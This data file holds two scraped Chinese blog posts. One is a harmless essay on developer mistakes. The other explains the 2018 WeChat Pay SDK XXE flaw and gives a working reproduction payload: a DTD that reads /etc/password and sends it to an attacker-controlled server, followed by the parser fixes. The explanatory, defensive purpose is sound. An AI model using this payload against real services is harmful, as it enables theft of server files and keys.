{"url_object_id": "6ef1af433054de7bb42416cdfc0fbfd8", "title": ["我作为开发者犯过的两次愚蠢的错误"], "url": "http://blog.jobbole.com/114164/", "create_date": "2018/06/29", "front_image_url": ["http://wx3.sinaimg.cn/mw690/7cc829d3gy1fsrtjp2o93j20hs0audih.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 1, "tags": "职场, 程序员, 职场", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/dimple11\">dimple11</a> 翻译，<a href=\"http://www.jobbole.com/members/liuchang\">刘唱</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://medium.freecodecamp.org/the-times-ive-messed-up-as-a-developer-3c0bcaa1afd6\">Zachary Kuhn</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>上周我和同事们简单地聊了聊我们工作中搞砸的那些事儿。如今早已不再犯那些错了，所以想起过去就觉得很好笑。但是笑归笑，其实当时犯的这些错让我们受益颇深。</p>\n<p><img class=\"alignnone aligncenter\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fsrtjp2o93j20hs0audih.jpg\" width=\"640\" height=\"390\"></p>\n<p style=\"text-align: center;\">（credit：Snecx）</p>\n<p>分享自己犯错的经历至关重要，能让别人从中吸取经验教训，而且可能让他们工作起来更上手。我在这儿记录了几条自己最近犯的错。</p>\n<h3>为什么有那么多生产数据库被误删？</h3>\n<p>几个月之前，Reddit 上发了一篇<a href=\"https://www.reddit.com/r/cscareerquestions/comments/6ez8ag/accidentally_destroyed_production_database_on/\">文章</a>，写的是一个入门级开发人员在上班第一天就误删了生产数据库。我们看到类似这种有人犯了特大的、不可磨灭的错误的文章，都不免心生畏惧。我们意识到自己并不是没可能犯那种错——大多数时候都是悬崖勒马。</p>\n<p>我在干第一份工作的时候，有一个高级数据库管理员在上班第一天就误删了生产数据库，这种例子简直比比皆是。工作团队用一周前旧的数据库备份帮他弥补了过失，让他保住了工作。如今十年过去了，都仍用这件事拿他开涮。</p>\n<p>今年年初有天早上，我被叫去调查一个客户生产中出现的问题。他们本来要针对一小部分用户进行产品的 β 测试，但是他们的网站首页突然什么都显示不出来了。我猜想可能是系统有 bug 或者有漏洞所致。</p>\n<p>我登录进生产机器，调出数据库，发现 articles 表是空的。OK，这证实了网页显示空白的情况。</p>\n<p>用户表里面还是有用户的，这就奇怪了，所以我们丢了所有的 articles，但起码他们的测试用户仍有他们的账号，我们可以解释说是这是个测试版，而且这种事情时有发生。</p>\n<p>接下来一会儿我就犯迷糊了。我记不清楚自己干了什么，我认为自己不会蠢到在控制台窗口输入了删除表中用户的指令，可情况就是这样——现在既没有 articles 表，也没有用户表。我呆坐着，感觉有点震惊。</p>\n<p>然后我的大脑高速运转，开始想办法修复问题。我真的删掉用户表了吗？是的。我们运行备份数据库了吗？没有。该怎么向客户解释呢？我不知道。</p>\n<p>我记得自己去找了项目经理，坐在她旁边解释事情发生的经过，articles 表中没有数据了，所以网站看上去是空的。哦对了，我还误删了用户表。现在他们需要重新邀请所有的用户——如果他们还能想清楚用户都有谁的话。哎呀。</p>\n<p>我回到自己的座位上，感觉深受挫败。</p>\n<p><strong>但是我觉得事情有些蹊跷，我们怎么可能一开始就丢了所有的 articles 表呢？</strong>于是我继续深究下去，一方面是因为难以接受这个结果，一方面是想挽回颜面。之后过了一小会儿，我注意到了关键问题。</p>\n<p>服务器上还有另外 5 个数据库，其中一个的名字和我正在看的那个数据库的名字非常相似。</p>\n<p>我一检查，发现 articles 都在里面，用户表也完好无损。事实证明是因为配置发生变化，无意间让它变成了生产数据库，导致网站指向了全新的数据库。我在里面看到的那些用户呢？种子数据罢了。</p>\n<p>真是如释重负！一早上神经紧绷、胃酸翻涌，搞得我浑身不适，但好在我们“修复”了所有的数据，并且找到了问题真正的症结所在，没有提前宣布误删数据库的坏消息。</p>\n<p>这个小插曲让我们受益良多，最简单的一个就是：现在我们总是在给数据库做备份……这可能是我们开发人员最有效的胃药。</p>\n<h3>总赶进度，却从来赶不上进度</h3>\n<p>我最近所犯的另一个突出 错误没那么戏剧化，实际上是由一个个小错误最终累积造成了大麻烦。</p>\n<p>我们项目开发的一大挑战就是时间紧张（但也不全是？）</p>\n<p>第一次开会时，我们一致觉得项目需要的时间比我们能够拿出来的时间多了一倍。从项目一开始，截止日期就步步紧逼，所以我们三下五除二就通过了认证环节，以便进入客户真正关心的功能环节。</p>\n<p>我只是之前在一个单页 app 中落实了一次认证，但仍然没有彻底理解 app 各部分是如何协调的。</p>\n<p>尽己所能用最快的速度把 app 赶出来，就是大错特错，<strong>我漏掉了一些非常重要的东西：</strong></p>\n<ol>\n<li>用户在登陆后，是通过 cookie 来加载的，但是我的 app 页面没有给加载提供等待时间，而是根据事件顺序来决定先后的，所以服务器会回复说你没有权限。这种错误很少见，而且很难再出现，因为大多数情况下事件都是按照正确的顺序来完成的。</li>\n<li>而且认证环节也从不检查用户令牌是否失效，如果你不经常访问网站，当发现了没法登上网站后，就需要注销登录再重新登进去。</li>\n<li>令牌应该在每次发起请求时都进行更新，但我从来都没有时间去理解这些规则。所以这里又产生了时间问题。如果我们一次同时发出几种请求，收到的回复取决于他们到来的顺序，那将来发送请求用到的令牌就是错的。</li>\n</ol>\n<p>我们卯足劲赶进度，但最终所用的时间还是要比给定的时间多一倍。区别就是我们开发出的 app 里面漏洞更多了，然后甚而要花更多的时间对漏洞进行追踪和修复。</p>\n<p>工作中的失误让我尴尬不已，在大家面前感到十分羞愧，因为我把一切都搞砸了。</p>\n<p>我要说一点：从那之后，我开始花时间学习认证机制，现在已经理解了 OAuth,、JWT、刷新令牌和失效。我仔细阅读了许多库里别人写的认证代码，而且建立了基于几种不同语言版本和框架的认证流程。</p>\n<h3>失败是成功之母</h3>\n<p>这是每次失败的经历给予我的启发。只要你愿意学习，几乎每次这样的经历都会让你从中受益。</p>\n<p>如果人能够从错误中吸取教训，那么就会有所进步。如果一个队员是第一次犯错，我尽量不会对他表现出不满态度，他们往往已经知道自己把事情搞糟了。</p>\n<p>但我也努力不去苛责那些总是犯错、屡教不改的人，他们也需要被同情。</p>\n<p>对待犯错，如果你能够做到这四点，那么就会不断进步：</p>\n<ul>\n<li>对曾经犯过的错误可以自嘲一番</li>\n<li>从中吸取经验教训</li>\n<li>在之后努力为自己正名</li>\n<li>和他人分享，让他人也能从中获益。</li>\n</ul>\n<p>关于犯错的宝贵价值，我留给你们一则名人轶事：20 世纪初期，IBM 的总裁托马斯·J·沃森遇到了一位因为多次决策错误让公司损失惨重的员工，当问及是否要开除这个员工时，沃森答道：</p>\n<blockquote><p>“不，我刚刚花了 60 万美元培训了他，我怎么会让其他人雇佣他来获得他的经历呢？”</p></blockquote>\n<p>你过去犯过哪些有意思的错？来一起分享吧！</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114164\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114164votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114164\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/dimple11\">dimple11</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/dimple11\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/09/28db3e36f17643a752be4b798d5ceabc.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/dimple11\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/dimple11/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/dimple11/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 15</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/2429e83a2e9ae3455ad465bd664afe485a339128.jpg"}
{"url_object_id": "f2c4471ed0ef1f9a2f5eb6a1621f2f3b", "title": ["谈谈微信支付曝出的漏洞"], "url": "http://blog.jobbole.com/114197/", "create_date": "2018/07/06", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/09/3fb6592ac92133a71f0ae78e43683e83.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 1, "tags": "IT技术, 安全", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/kismetv/p/9266224.html\">编程迷思</a>   </div><h1>一、背景</h1>\n<p>昨天（2018-07-04）微信支付的SDK曝出重大漏洞（XXE漏洞），通过该漏洞，攻击者可以获取服务器中目录结构、文件内容，如代码、各种私钥等。获取这些信息以后，攻击者便可以为所欲为，其中就包括众多媒体所宣传的“0元也能买买买”。</p>\n<p>漏洞报告地址；http://seclists.org/fulldisclosure/2018/Jul/3</p>\n<h1>二、漏洞原理</h1>\n<h2>1.  XXE漏洞</h2>\n<p>此次曝出的漏洞属于XXE漏洞，即XML外部实体注入（XML External Entity Injection）。</p>\n<p>XML文档除了可以包含声明和元素以外，还可以包含文档类型定义（即DTD）；如下图所示。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/fd852c808e1da4c7f569a8ac7e846bb6.png\" alt=\"\"></p>\n<p>在DTD中，可以引进实体，在解析XML时，实体将会被替换成相应的引用内容。该实体可以由外部引入(支持http、ftp等协议，后文以http为例说明)，如果通过该外部实体进行攻击，就是XXE攻击。</p>\n<p>可以说，<strong>XXE漏洞之所以能够存在，本质上在于在解析XML的时候，可以与外部进行通信；当XML文档可以由攻击者任意构造时，攻击便成为可能。</strong>在利用XXE漏洞可以做的事情当中，最常见最容易实现的，便是读取服务器的信息，包括目录结构、文件内容等；本次微信支付爆出的漏洞便属于这一种。</p>\n<h2>2.  微信支付漏洞</h2>\n<p>本次漏洞影响的范围是：在微信支付异步回调接口中，使用微信支付SDK进行XML解析的应用。注意这里的SDK是服务器端的SDK，APP端使用SDK并不受影响。</p>\n<p>SDK下载地址如下（目前微信官方宣传漏洞已修复）：https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip</p>\n<p>SDK中导致漏洞的代码是WXPayUtil工具类中的xmlToMap()方法：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6d8373c58efb34c2810ec33cacbf601c.png\" alt=\"\"></p>\n<p>如上图所示，由于在解析XML时没有对外部实体的访问做任何限制，如果攻击者恶意构造xml请求，便可以对服务器进行攻击。下面通过实例介绍攻击的方法。</p>\n<h2>3.  攻击复现</h2>\n<p>下面在本机环境下进行复现。</p>\n<p>假设本地的web服务器127.0.0.1:8080中存在POST接口：/wxpay/callback，该接口中接收xml字符串做参数，并调用前述的WXPayUtil.xmlToMap(strXml)对xml参数进行解析。此外，/etc/password中存储了重要的密码数据（如password1234）。</p>\n<p>攻击时构造的请求如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/9606ad59ae08f52ccf9b7d1fe44b6c09.png\" alt=\"\"></p>\n<p>其中xml内容如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b622fbf6d697965596711\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\r\n&lt;!DOCTYPE root [\r\n    &lt;!ENTITY % file SYSTEM \"file:///etc/password\"&gt;\r\n    &lt;!ENTITY % xxe SYSTEM \"http://127.0.0.1:9000/xxe.dtd\"&gt;\r\n    %xxe;\r\n]&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d697965596711-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d697965596711-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d697965596711-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d697965596711-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d697965596711-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d697965596711-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b622fbf6d697965596711-1\"><span class=\"crayon-ta\">&lt;?</span><span class=\"crayon-e\">xml </span><span class=\"crayon-i\">version</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"1.0\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">encoding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"utf-8\"</span><span class=\"crayon-ta\">?&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d697965596711-2\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-e\">DOCTYPE </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span></div><div class=\"crayon-line\" id=\"crayon-5b622fbf6d697965596711-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">ENTITY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">file </span><span class=\"crayon-i\">SYSTEM</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"file:///etc/password\"</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d697965596711-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">ENTITY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">xxe </span><span class=\"crayon-i\">SYSTEM</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"http://127.0.0.1:9000/xxe.dtd\"</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b622fbf6d697965596711-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">xxe</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d697965596711-6\"><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0033 seconds] -->\r\n<p>其中/etc/password为要窃取的对象，http://127.0.0.1:9000/xxe.dtd为攻击者服务器中的dtd文件，内容如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b622fbf6d6a3479226050\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;!ENTITY % shell \"&lt;!ENTITY % upload SYSTEM 'http://127.0.0.1:9000/evil/%file;'&gt;\"&gt;\r\n%shell;\r\n%upload;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d6a3479226050-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d6a3479226050-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d6a3479226050-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d6a3479226050-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b622fbf6d6a3479226050-1\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">ENTITY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">shell</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"&lt;!ENTITY % upload SYSTEM 'http://127.0.0.1:9000/evil/%file;'&gt;\"</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d6a3479226050-2\"><span class=\"crayon-ta\">%</span><span class=\"crayon-v\">shell</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b622fbf6d6a3479226050-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d6a3479226050-4\"><span class=\"crayon-o\">%</span><span class=\"crayon-v\">upload</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0032 seconds] -->\r\n<p>通过xml+dtd文件，攻击者便可以在服务器http://127.0.0.1:9000中收到如下请求：</p>\n<p>http://127.0.0.1:9000/evil/password1234</p>\n<p>这样，攻击者便得到了/etc/password文件的内容。</p>\n<p>在本例中，攻击者窃取了/etc/password文件中的内容，实际上攻击者还可以获取服务器中的目录结构以及其他文件，只要启动web应用的用户具有相应的读权限。如果获取的信息比较复杂，如包含特殊符号，无法直接通过http的URL发送，则可以采用对文件内容进行Base64编码等方法解决。</p>\n<h1>三、漏洞的解决</h1>\n<p>解决该漏洞的原理非常简单，只要禁止解析XML时访问外部实体即可。</p>\n<p>漏洞曝出以后，微信进行了紧急修复，一方面是更新了SDK，并提醒开发者使用最新的SDK；SDK中修复代码如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/4216f33b379b06b889d166d080606b0a.png\" alt=\"\"></p>\n<p>加入了如下两行代码：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b622fbf6d6a8761007286\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndocumentBuilderFactory.setExpandEntityReferences(false);\r\ndocumentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d6a8761007286-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d6a8761007286-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b622fbf6d6a8761007286-1\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setExpandEntityReferences</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d6a8761007286-2\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">XMLConstants</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">FEATURE_SECURE_PROCESSING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n\n</div>\n<p>更新：微信表示上述2条语句无法禁止该漏洞，又双叒叕更新了官方SDK，加了以下语句（对于微信的这波操作，不知如何评价）：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b622fbf6d6ac896797629\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\r\ndocumentBuilderFactory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\r\ndocumentBuilderFactory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\r\ndocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", 